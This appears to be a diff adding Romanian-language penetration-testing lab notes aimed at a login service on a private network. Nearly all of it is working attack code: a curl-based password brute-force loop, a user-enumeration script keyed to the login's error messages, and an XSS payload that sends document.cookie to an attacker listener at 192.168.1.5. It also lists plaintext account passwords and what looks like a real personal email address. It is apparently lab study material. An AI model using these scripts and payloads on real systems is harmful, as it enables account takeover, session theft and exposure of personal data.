@@ -1,0 +1,44 @@
+parola conturi sec: Pa55word!
+                    Cisco55!
+
+4.3 BruteForce
+
+#!/bin/bash
+for pass in 123 1234 12345 password admin test ceva Cisco55!; do
+  echo "Trying $pass"
+  curl -k -s -X POST https://192.168.1.4:5000/login \
+  -d "email=analyst&password=$pass" | grep -E "Wrong|Invalid|password|credentials|locked"
+done
+
+4.4 UserEnumeration
+
+nano users.txt
+
+admin@test.com
+user@test.com
+sebastian.colt23@gmail.com
+manager@test.com
+test@test.com
+analyst
+
+while read user; do
+  echo "[*] Testing $user"
+
+  response=$(curl -k -s -X POST https://192.168.1.4:5000/login \
+    -d "email=$user&password=parola_gresita")
+
+  if echo "$response" | grep -q "Wrong password"; then
+    echo "[+] VALID USER: $user"
+  elif echo "$response" | grep -q "User does not exist"; then
+    echo "[-] Invalid user: $user"
+  elif echo "$response" | grep -q "Invalid credentials"; then
+    echo "[~] Invalid user: $user"
+  fi
+
+done < users.txt
+
+4.5 
+python3 -m http.server 8000   
+<script>
+fetch('http://192.168.1.5:8000/?c=' + document.cookie)
+</script>
